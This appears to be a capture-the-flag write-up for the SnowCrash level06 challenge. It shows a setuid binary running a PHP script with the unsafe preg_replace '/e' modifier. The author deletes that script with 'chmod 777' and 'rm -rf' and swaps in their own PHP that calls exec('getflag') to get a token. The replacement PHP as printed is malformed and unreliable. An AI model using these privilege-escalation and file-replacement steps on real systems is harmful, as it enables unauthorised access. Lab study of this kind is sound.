# level0

We found an script PHP and a binary file

There is a php script and a executable user + s 

```
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile

```
The binary executes the php script and it looks like it expects to receive a file as an argument

```
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

```

We check the inside to see if we get more hints

```
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Then we just try to replace this file by one of our own that executes a shell command from php

```
chmod 777 .
rm -rf level06.php
vim level06.php
```

``` 
#!/usr/bin/php
<?php
	"echo exec("getflag")"
?>
```

Now if we run ./level06
```
./level06

level06@SnowCrash:~$ ./level06
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

Wiiii we got it!!!!
